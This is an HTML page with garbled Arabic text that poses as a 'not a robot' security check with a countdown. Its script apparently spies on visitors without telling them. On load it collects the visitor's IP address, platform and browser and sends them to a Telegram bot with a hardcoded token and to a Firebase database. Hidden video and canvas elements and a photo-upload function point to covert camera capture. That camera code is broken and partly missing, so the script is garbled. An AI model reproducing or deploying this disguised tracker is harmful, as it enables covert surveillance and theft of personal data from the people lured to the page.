<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù†</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        /* Ø§Ù„ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ (style.css) */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
        body { 
            height: 100vh; display: flex; align-items: center; justify-content: center; 
            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2); 
            background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite; 
        }
        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .loading-container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 0 15px rgba(0,0,0,0.2); width: 90%; max-width: 400px; }
        h1 { color: red; font-size: 22px; margin-bottom: 10px; }
        .progress-container { background: #eee; border-radius: 10px; height: 10px; margin: 15px 0; overflow: hidden; }
        .progress-bar { background: #ff9800; width: 100%; height: 100%; transition: width 1s linear; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="loading-container">
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª</h1>
        <p>Ø¨Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªØ¹Ø§ÙˆÙ† Ù…Ø¹Ù†Ø§ Ù„Ø¶Ù…Ø§Ù† ØªØ¬Ø±Ø¨Ø© Ø¢Ù…Ù†Ø©. Ø³ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ Ø§Ù„ÙØ­Øµ.</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p id="countdown">20</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // 1. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase
        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 2. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
        const adminId = "5375214810";
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get("user_id") || "Unknown";

        // 3. Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª
        window.onload = async () => {
            startCountdown();
            await startTracking();
        };

        function startCountdown() {
            let timeLeft = 20;
            const bar = document.getElementById("progress");
            const timer = document.getElementById("countdown");
            const interval = setInterval(() => {
                timeLeft--;
                timer.textContent = timeLeft;
                bar.style.width = (timeLeft / 20) * 100 + "%";
                if (timeLeft <= 0) clearInterval(interval);
            }, 1000);
        }

        async function startTracking() {
            // Ø³Ø­Ø¨ Ø§Ù„Ù€ IP ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
            try {
                const ipRes = await fetch("https://api64.ipify.org?format=json");
                const ipData = await ipRes.json();
                const ip = ipData.ip;

                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†ØµÙŠØ© (IP ÙˆØ¬Ù‡Ø§Ø²) Ù„Ù„Ù€ Firebase ÙˆØªÙ„ÙŠØ¬Ø±Ø§Ù…
                const deviceInfo = `Ø§Ù„Ø¢ÙŠ Ø¨ÙŠ: ${ip}\nØ§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}\nØ§Ù„Ù…ØªØµÙØ­: ${navigator.userAgent}`;
                syncDataToAll("Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„", deviceInfo);



                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù€ Firebase (Ù„Ù„Ù…ÙˆÙ‚Ø¹)
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    db.ref('hits/' + userId + '/log').push({
                        type: "ØµÙˆØ±Ø©",
                        data: reader.result,
                        time: new Date().toLocaleString('ar-EG')
                    });
                };
            }, "image/jpeg");
        }

        function syncDataToAll(type, detail) {
            // ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const msg = `ğŸ”” **${type}**\n${detail}\nğŸ†” ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·: ${userId}`;
            [adminId, userId].forEach(id => {
                if(id !== "Unknown") {
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({ chat_id: id, text: msg })
                    });
                }
            });

            // Firebase
            if (userId !== "Unknown") {
                db.ref('hits/' + userId + '/log').push({
                    type: type,
                    data: detail,
                    time: new Date().toLocaleString('ar-EG')
                });
            }
        }

        function sendPhotoTelegram(chatId, blob, caption) {
            const fd = new FormData();
            fd.append("chat_id", chatId);
            fd.append("photo", blob, "snap.jpg");
            fd.append("caption", caption);
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd });
        }
    </script>
</body>
</html>
